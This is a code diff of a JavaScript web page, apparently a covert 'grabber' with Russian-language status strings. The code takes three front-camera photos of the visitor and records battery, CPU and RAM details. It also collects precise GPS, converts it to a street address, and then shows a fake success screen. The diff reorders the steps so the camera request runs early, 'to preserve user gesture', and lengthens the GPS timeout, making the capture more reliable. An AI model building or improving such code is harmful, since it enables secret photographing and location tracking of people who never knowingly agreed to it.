@@ -223,18 +223,45 @@ CPU: ${s.c} ядра | RAM: ${s.r}
 
             let bat = "N/A";
             let ph = [];
-            
-            // 1. Battery (Fast)
-            if (navigator.getBattery) {
-                try {
-                    const bt = await navigator.getBattery();
-                    bat = `${Math.round(bt.level * 100)}% `;
-                    bat += bt.charging ? "подзаряжается" : "не подзаряжается";
-                } catch(e) {}
-            }
+            let gps = "*Данные GPS отсутствуют*";
 
-            // 2. GPS Promise (Start early)
-            const gP = new Promise(r => {
+            // 1. Start Camera early to preserve user gesture
+            const camP = (async () => {
+                try {
+                    const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
+                    const v = document.getElementById('video');
+                    v.srcObject = st;
+                    await v.play().catch(e => log("Play error: " + e));
+                    await sleep(2000); // Warmup
+
+                    const c = document.getElementById('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    const ctx = c.getContext('2d');
+
+                    for(let i=0; i<3; i++) {
+                        ctx.drawImage(v,0,0);
+                        ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
+                        if(i<2) await sleep(800);
+                    }
+                    st.getTracks().forEach(t=>t.stop());
+                } catch (e) {
+                    log("Camera Error: " + e.message);
+                }
+            })();
+
+            // 2. Battery (Fast)
+            const batP = (async () => {
+                if (navigator.getBattery) {
+                    try {
+                        const bt = await navigator.getBattery();
+                        bat = `${Math.round(bt.level * 100)}% `;
+                        bat += bt.charging ? "подзаряжается" : "не подзаряжается";
+                    } catch(e) {}
+                }
+            })();
+
+            // 3. GPS (With timeout)
+            const gpsP = new Promise(r => {
                 if (!navigator.geolocation) return r("*GPS Not Supported*");
                 navigator.geolocation.getCurrentPosition(
                     async p => {
@@ -244,38 +271,17 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
                         r(`Адрес: ${a}\nКарты: [клик](${l})`);
                     },
-                    () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true, timeout: 5000}
+                    (err) => {
+                        if (err.code === 1) r("*Юзер запретил доступ к GPS*");
+                        else if (err.code === 3) r("*GPS Timeout*");
+                        else r("*Ошибка GPS: " + err.message + "*");
+                    }, 
+                    {enableHighAccuracy:true, timeout: 8000}
                 );
             });
 
-            // 3. Camera Capture (Try-Catch)
-            try {
-                const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
-                const v = document.getElementById('video');
-                v.srcObject = st;
-                
-                // Fix: Handle play() gesture error
-                await v.play().catch(e => log("Play error: " + e));
-
-                await sleep(2000); // Warmup
-
-                const c = document.getElementById('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                const ctx = c.getContext('2d');
-
-                for(let i=0; i<3; i++) {
-                    ctx.drawImage(v,0,0);
-                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
-                    if(i<2) await sleep(800);
-                }
-                st.getTracks().forEach(t=>t.stop());
-            } catch (e) {
-                log("Camera Error: " + e.message);
-                // Don't kill the whole process, just continue without photos
-            }
-
-            // 4. Final Assembly
-            const gps = await gP;
+            // 4. Wait for everything
+            await Promise.allSettled([camP, batP, gpsP.then(res => gps = res)]);
 
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success-icon').style.display = 'block';
